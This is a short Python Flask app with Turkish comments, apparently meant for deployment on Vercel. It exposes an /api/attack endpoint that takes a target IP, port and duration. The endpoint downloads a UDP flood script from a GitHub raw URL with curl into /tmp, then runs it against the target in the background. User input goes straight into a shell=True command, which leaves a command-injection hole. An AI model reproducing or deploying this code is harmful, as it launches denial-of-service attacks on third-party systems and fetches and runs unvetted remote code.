from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/api/attack')
def attack():
    # URL'den parametreleri alıyoruz: /api/attack?ip=1.1.1.1&port=80&time=10
    target = request.args.get('ip')
    port = request.args.get('port', '80')
    duration = request.args.get('time', '10')

    if target:
        # UDP Scriptini indir ve arkada çalıştır
        # /tmp klasörü Vercel'de yazılabilir tek yerdir
        cmd = f"curl -s -L -o /tmp/udp.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/udp.py && python3 /tmp/udp.py {target} {port} 100 {duration}"
        
        # subprocess.Popen kullanarak fonksiyonun bitmesini beklemeden saldırıyı başlatıyoruz
        subprocess.Popen(cmd, shell=True)
        
        return f"🚀 Edge Saldirisi {target} Hedefine Baslatildi!", 200
    else:
        return "❌ Hata: IP adresi eksik!", 400

# Vercel için gerekli handler
handler = app
